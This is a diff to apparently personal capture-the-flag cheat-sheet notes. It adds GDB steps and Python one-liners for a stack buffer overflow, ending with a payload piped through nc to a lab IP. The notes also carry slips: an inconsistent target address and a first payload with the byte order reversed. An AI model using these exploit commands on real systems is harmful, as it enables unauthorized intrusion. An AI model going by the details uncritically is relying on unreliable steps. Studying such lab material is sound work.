@@ -472,3 +472,25 @@ SSH TUNNEL REDIRECTION
 ssh -i id_rsa -L 8111:127.0.0.1:8111 USER@IP
 
 --> using id_rsa we have to a server, we can redirect service from 8111 to local machine
+
+<br />
+<br />
+
+GDB - buffer overflow
+
+gdb -q file
+set dissassembly-flavor intel
+disas main
+
+We get number of funtion before main e.g 400686 and we try to find the spot where program gets 'segmentation fault'
+
+python -c "print('A'*39+'\x40\x06\x86')" | ./binary
+
+
+If we want to hit 4000686 with python print, value has to be x86 x06 x40 = inverted
+
+then we add two times 0 so finally:
+
+(python -c "print('A'*40+'\x86\x06\x40\x00\x00')";cat) | nc  10.10.75.176 5700 
+
+--> sends payload to netcat server
